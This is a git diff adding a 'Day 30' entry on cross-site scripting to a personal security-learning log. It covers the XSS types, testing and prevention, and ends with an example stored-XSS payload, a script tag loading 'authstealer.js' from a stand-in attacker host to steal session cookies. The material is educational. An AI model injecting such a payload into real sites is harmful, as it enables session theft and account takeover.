@@ -31,7 +31,7 @@ I will be learning Network security and Database vulnerabilities for 30 days and
 - [Day 27](#Day-27)
 - [Day 28](#Day-28)
 - [Day 29](#Day-29)
-
+- [Day 30](#Day-30)
 
 
 
@@ -2890,4 +2890,105 @@ Use secure coding practices: Use secure coding practices, such as following secu
 
 By implementing these preventive measures, an application can significantly reduce the risk of LDAP injection attacks and other types of injection attacks.
 
+
+
+# Day 30
+
+Today I learned about Cross-site scripting (XSS) and its working process. Then i learned about three main  types of XSS attack such as stored XSS, Reflected XSS and DOM-based XSS with testing method for it After that I learned how to be prevented from XSS attack with example 
+
+
+## Cross-site scripting (XSS)
+ Cross-site scripting (XSS) is a type of injection attack in which a threat actor inserts data, such as a malicious script, into content from trusted websites. The malicious code is then included with dynamic content delivered to a victim's browser.
+
+XSS is one of the most common cyber attack types. Malicious scripts are often delivered in the form of bits of JavaScript code that the victim's browser executes. Exploits can incorporate malicious executable code in many other languages, including Java, Ajax and Hypertext Markup Language (HTML). Although XSS attacks can be serious, preventing the vulnerabilities that enable them is relatively easy.
+
+XSS enables an attacker to execute malicious scripts in another user's browser. However, instead of attacking the victim directly, the attacker exploits a vulnerability in a website the victim visits and gets the website to deliver the malicious script.
+
+
+### Working process of cross-site scripting 
+
+
+XSS is similar to other injection attacks, such as Structured Query Language injection. It takes advantage of the inability of browsers to distinguish legitimate markup from malicious markup. They execute whatever markup text they receive and deliver it to the users that request it.
+
+XSS attacks circumvent the Same Origin Policy. SOP is a security measure that prevents scripts originating in one website from interacting with scripts from a different website. Under SOP, all content on a webpage must come from the same source. When the policy isn't enforced, malicious actors can inject scripts and modify a webpage to suit their own purposes. For example, attackers can extract data that lets them impersonate an authenticated user or input malicious code for the browser to execute.
+
+With an XSS exploit, an attacker can steal session cookies and then pretend to be the user (victim). But it's not just stealing cookies; attackers can use XSS to spread malware, deface websites, create havoc on social networks, phish for credentials and, in conjunction with social engineering techniques, perpetrate more damaging attacks.
+
+
+### Types of XSS Attack:
+
+There are three main categories of cross-site scripting vulnerabilities: stored XSS, reflected XSS and Document Object Model (DOM)-based XSS.
+
+#### Stored XSS
+Stored XSS attacks are also called persistent XSS. It is the most damaging type of cross-site scripting attack. The attacker injects a malicious script, also called a payload. The payload is stored permanently on the target application, such as a database, blog, message board, in a forum post or in a comment field.
+
+The XSS payload is then served as part of a webpage when victims navigate to the affected webpage in a browser. Once victims view the page in a browser, they will inadvertently execute the malicious script.
+
+
+#### Reflected XSS
+
+Reflected XSS is the most common type of cross-site scripting vulnerability. In this type of attack, the attacker must deliver the payload to the victim. The attacker uses phishing and other social engineering methods to lure victims to inadvertently make a request to the web server that includes the XSS payload script.
+
+The Hypertext Transfer Protocol response that is reflected back includes the payload from the HTTP request. The victim then executes the script that gets reflected and executed inside the browser. Because reflected XSS isn't a persistent attack, the attacker must deliver the payload to each victim.
+
+
+#### DOM-based XSS
+DOM-based attacks are advanced ones made possible when the web application's client-side script writes user-provided data to the DOM. The web application reads the data from the DOM and delivers it to the browser. If the data isn't handled correctly, the attacker is able to inject a payload that will be stored as part of the DOM. The payload is then executed when the data is read back from the DOM.
+
+
+### Testing method for XSS vulnerabilities:
+
+A website is vulnerable to XSS when it passes unvalidated input from requests back to the client.
+
+Web scanning tools can be used to test a website's or application's vulnerability. These tools inject a script into the web application -- for instance, GET or POST variables, URLs, cookies and other code that could hold a cross-scripting attack.
+
+If the tool can inject that kind of information into the webpage, then the site is vulnerable to XSS. The tool notifies the user of the vulnerability and the script that was injected to find it.
+
+It is also possible to test manually for XSS vulnerabilities with the following steps:
+
+1. Find input vectors. 
+This involves determining all the application's user-defined inputs. In-browser HTML editors or web proxies can be used to accomplish this.
+
+2. Analyze input vectors.
+ Specific input data triggers responses from the browser that show the vulnerability. The Open Web Application Security Project (OWASP) provides a list of test input data.
+
+3. Check the impact of test input:
+The tester should analyze the results of the input they choose and determine if the vulnerabilities discovered would affect application security. The tester should identify HTML special characters that create vulnerabilities that must be replaced or otherwise filtered or removed.
+
+
+### Preventive measures of  cross-site scripting:
+
+The following are best practices to eliminate application security flaws that enable cross-site scripting:
+
+* Escaping user input 
+It is one way to prevent XSS vulnerabilities in applications. Escaping means taking the data an application has received and ensuring it's secure before rendering it for the user. Doing this prevents key characters in the data that a webpage receives from being interpreted as executable code. It prevents the browser from interpreting characters used to signal the start or end of executable code, and it translates them to escaped. For example, quote characters, parentheses, brackets and some other punctuation marks are sometimes used to set off executable code. Escaping these characters means converting them from single characters that aren't displayed into strings that the browser interprets as printable versions of the characters.
+
+* Sanitizing user input:
+It scrubs data clean of potentially executable characters. It changes unacceptable user input to an acceptable format and ensures the data received can't be interpreted as executable code. This approach is especially helpful on webpages that allow HTML markup.
+
+* Validating input
+It  makes certain an application is rendering the correct data and that malicious data does not harm a website, database and users. Validating input prevents XSS from being used in forms. It stops users from adding special characters into webpage data entry fields by refusing the request. Input validation helps reduce the possibility of harm if an attacker should discover such an XSS vulnerability.
+
+The surest way to prevent XSS attacks is to distrust user input. All user input rendered as part of HTML output should be treated as untrusted, whether it is from an authenticated user or not.
+
+### Impact of XSS
+
+The degree to which an XSS exploit affects a website depends on the application or site attacked, as well as the data and compromised user involved. The following is generally true about the potential impact of an XSS attack:
+
+* If sensitive data, such as bank transactions and healthcare records, is involved, the impact could be serious.
+* The higher the compromised user's privileges are in an application, the more critical the impact of the attack is likely to be.
+* If users input sensitive, personally identifiable information, the effect can be severe.
+
+Cross-site scripting can affect an entire organization as well. For example, if an e-commerce website is found to be the origin of an XSS attack, it can damage the company's reputation and the customer trust.
+
+### Examples of cross-site scripting
+
+One example of a stored XSS attack is to inject malicious code into the comment field of an e-commerce site. An attacker embeds code within a comment, writing "Read my review of this item!" alongside code with a malicious URL embedded. The code might say something like:
+
+<script src=http://evilhack.com/authstealer.js></script>
+
+This will cause the website's server to store the malicious script as a comment. When the user visits the page with comments on it, the browser will interpret the code as JavaScript instead of HTML and execute the code.
+
+The comment containing the malicious content between the script tags will load every time the page is loaded. Loading the page will activate a malicious JavaScript file hosted on another website, which can steal a user's session cookies. The cookies likely store important information about the user's behavior on the e-commerce site, such as login information. With that information, the hacker may be able to access more sensitive data on the account, such as payment or contact information.
+The user does not need to click any link on the page -- or even see the malicious comment -- for it to steal data; the user simply needs to visit the page. This is different from a reflected XSS attack, which would require the user to click on the link.
 
